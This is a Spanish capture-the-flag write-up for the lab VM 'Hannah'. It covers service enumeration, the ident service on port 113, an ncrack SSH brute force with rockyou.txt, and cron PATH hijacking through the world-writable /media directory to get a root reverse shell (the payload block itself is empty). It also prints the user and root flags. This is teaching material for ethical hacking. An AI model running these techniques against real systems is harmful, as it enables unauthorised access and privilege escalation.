---
title: "🖥️ Máquina: Hannah — Hacking Ético"
aliases:
  - Hannah
  - Máquina Hannah
  - VM Hannah
  - Writeup Hannah
tags:
  - ifct0109
  - hacking-etico
  - vms
  - linux
  - ctf
---

# 🖥️ Máquina: Hannah

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Dificultad:** Conceptos Básicos  
> **Técnicas trabajadas:** Enumeración de servicios · Servicio ident (puerto 113) · Fuerza bruta SSH (ncrack) · Escalada de privilegios (PATH Hijacking en cron)  
> **Descripción:** En esta práctica utilizaremos el servicio ident para identificar usuarios del sistema asociados a puertos activos, realizaremos fuerza bruta SSH y escalaremos privilegios mediante PATH Hijacking sobre una tarea cron, aprovechando que el PATH del crontab incluye un directorio en el que tenemos permisos de escritura.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.6`
* **`RHOST` (Víctima / Hannah):** Ej. `10.0.0.11`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Hannah tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Exportamos la IP de la víctima como variable de entorno para mayor comodidad:

```bash
export rhost=10.0.0.11
```

Lanzamos un escaneo completo de puertos TCP:

```bash
nmap -sT -p- $rhost
```

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
113/tcp open  ident
```

> [!info] Resultado
> Tres puertos abiertos. El puerto 113 corresponde al servicio ident, un servicio poco habitual que analizaremos en detalle más adelante.

Lanzamos un escaneo detallado sobre los tres puertos:

```bash
nmap -v -A $rhost -p 22,80,113
```

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
| http-robots.txt: 1 disallowed entry
|_/enlightenment
113/tcp open  ident?
|_auth-owners: root
```

> [!info] Resultado
> Datos relevantes del escaneo:
> · El servidor web corre nginx 1.18.0.
> · El campo auth-owners del puerto 80 muestra moksha, el usuario del sistema que gestiona ese proceso. Esto ya nos da un nombre de usuario potencial.
> · El archivo robots.txt tiene una entrada Disallow para /enlightenment. La investigaremos.

---

## 🌐 Fase 2: Enumeración web

Consultamos el archivo robots.txt para ver la ruta prohibida:

```bash
curl http://10.0.0.11/robots.txt
```

```text
Disallow: /enlightenment
```

Intentamos acceder a esa ruta:

```bash
curl http://10.0.0.11/enlightenment
```

```text
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
</body>
</html>
```

> [!info] Resultado
> La ruta /enlightenment devuelve un 404. Es un dato observado sin vector útil: puede ser una ruta que ya no existe o una pista que no lleva a ningún sitio. Continuamos investigando por otros servicios.

---

## 🔌 Fase 3: Enumeración con ident (puerto 113)

El servicio ident (también llamado auth o identification protocol) fue diseñado para que los servidores pudieran preguntar a un sistema remoto qué usuario local es el responsable de una conexión TCP concreta. Su funcionamiento es simple: dado un número de puerto, el servidor ident responde con el nombre del usuario del sistema operativo que tiene abierta esa conexión.

Aunque hoy está en desuso y se considera inseguro, en máquinas que lo tienen activo es una fuente directa de información sobre usuarios del sistema sin necesidad de autenticación. Verificamos primero que el puerto responde:

```bash
nc -vn 10.0.0.11 113
```

```text
(UNKNOWN) [10.0.0.11] 113 (auth) open
```

> [!info] Resultado
> El servicio está activo y acepta conexiones. Instalamos ident-user-enum, una herramienta específica para consultar el servicio ident en múltiples puertos de forma automática:

```bash
sudo apt install ident-user-enum
```

Le pasamos la IP del objetivo y los puertos que queremos consultar. La herramienta preguntará al servicio ident qué usuario del sistema tiene abierta una conexión en cada uno de esos puertos:

```bash
ident-user-enum 10.0.0.11 22 113 80
```

```text
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

10.0.0.11:22    root
10.0.0.11:113   root
10.0.0.11:80    moksha
```

> [!info] Resultado
> La respuesta del servicio ident confirma:
> · Los puertos 22 (SSH) y 113 (ident) están siendo gestionados por root.
> · El puerto 80 (HTTP) está siendo gestionado por el usuario moksha.
> Esto confirma que moksha es un usuario real del sistema. Ahora intentaremos obtener su contraseña por fuerza bruta.

---

## 🔐 Fase 4: Fuerza bruta SSH

Con el usuario moksha identificado, lanzamos un ataque de fuerza bruta sobre SSH con ncrack. La opción -f detiene el ataque en cuanto encuentra una contraseña válida:

```bash
ncrack -u moksha -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.11 -f
```

```text
10.0.0.11 22/tcp ssh: 'moksha' 'hannah'
```

> [!info] Resultado
> Credenciales encontradas:
> · Usuario: moksha
> · Contraseña: hannah — que coincide con el propio nombre de la máquina.

---

## 🔑 Fase 5: Acceso SSH y flag de usuario

```bash
ssh moksha@10.0.0.11
```

```text
# Contraseña: hannah
```

```bash
id
```

```text
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
```

```bash
cat user.txt
```

```text
HMVGGHFWP2023
```

> [!info] Resultado
> Flag de usuario obtenida: HMVGGHFWP2023

---

## 🚀 Fase 6: Escalada de privilegios — PATH Hijacking en cron

Comprobamos primero las vías habituales de escalada:

```bash
sudo -l
```

```text
-bash: sudo: orden no encontrada
```

```bash
find / -type f -perm -u=s 2>/dev/null
```

> [!info] Resultado
> Sin resultados en ninguna de las dos vías. Revisamos las tareas programadas del sistema:

```bash
cat /etc/crontab
```

```text
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

* * * * *  root  touch /tmp/enlIghtenment
```

> [!info] Resultado
> Dos datos críticos en este archivo:
> 1. La tarea cron: root ejecuta el comando touch cada minuto sobre el archivo /tmp/enlIghtenment. La conexión con la ruta /enlightenment que vimos en el robots.txt no es casualidad. El comando touch se llama con una ruta relativa, es decir, sin especificar su ruta completa como /usr/bin/touch. Esto lo hace vulnerable a PATH Hijacking.
> 2. El PATH del crontab: /usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
> Este es el PATH que usará root al ejecutar la tarea. Es fundamental entender que el PATH Hijacking en una tarea cron debe hacerse dentro de los directorios listados en el PATH del propio crontab, no en directorios como /tmp que no aparecen en él. Si creáramos nuestro touch malicioso en /tmp, root nunca lo encontraría porque /tmp no está en su PATH.

Ahora necesitamos encontrar un directorio del PATH del crontab en el que tengamos permisos de escritura. Comprobamos los permisos de cada uno en orden, de izquierda a derecha, hasta encontrar uno accesible:

```bash
ls -ld /usr/local/sbin /usr/local/bin /sbin /media /bin /usr/sbin /usr/bin
```

```text
drwxr-xr-x  root root  /usr/local/sbin
drwxr-xr-x  root root  /usr/local/bin
drwxr-xr-x  root root  /sbin
drwxrwxrwx  root root  /media
drwxr-xr-x  root root  /bin
drwxr-xr-x  root root  /usr/sbin
drwxr-xr-x  root root  /usr/bin
```

> [!info] Resultado
> El único directorio del PATH del crontab en el que todos los usuarios tienen permisos de escritura (rwxrwxrwx) es /media. El resto solo son escribibles por root. Este es el directorio que usaremos para colocar nuestro touch malicioso.
> También podemos confirmarlo consultando los grupos del usuario:

```bash
groups
```

```text
moksha cdrom floppy audio dip video plugdev netdev
```

```bash
ls -ld /media/
```

```text
drwxrwxrwx 3 root root 4096 ene  4 10:39 /media/
```

El ataque consiste en crear en /media un archivo llamado touch que en realidad es una reverse shell, y añadir /media al principio del PATH de nuestra sesión. Cuando cron ejecute touch, encontrará primero el nuestro en /media antes que el real en /usr/bin/touch:

Primero nos ponemos a la escucha en Kali en una terminal separada:

```bash
nc -lvnp {{LPORT}}
```

Añadimos /media al principio del PATH de nuestra sesión actual:

```bash
export PATH=/media:$PATH
```

```bash
echo $PATH
```

```text
/media:/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin
```

Creamos el archivo touch malicioso en /media con el payload de reverse shell y le damos permisos de ejecución:

```bash

```

```bash
chmod +x /media/touch
```

> [!info] Resultado
> Ahora esperamos como máximo 1 minuto a que cron ejecute la tarea. Cuando root llame a touch, el sistema buscará el comando recorriendo su PATH en orden y encontrará primero /media/touch, nuestro archivo malicioso, antes que el touch real. Al ejecutarlo con privilegios de root, recibiremos la conexión en netcat.

```text
connect to [10.0.0.6] from (UNKNOWN) [10.0.0.11] ...
# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
cat /root/root.txt
```

```text
HMVHAPPYNY2023
```

> [!info] Resultado
> Flag de root obtenida: HMVHAPPYNY2023

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
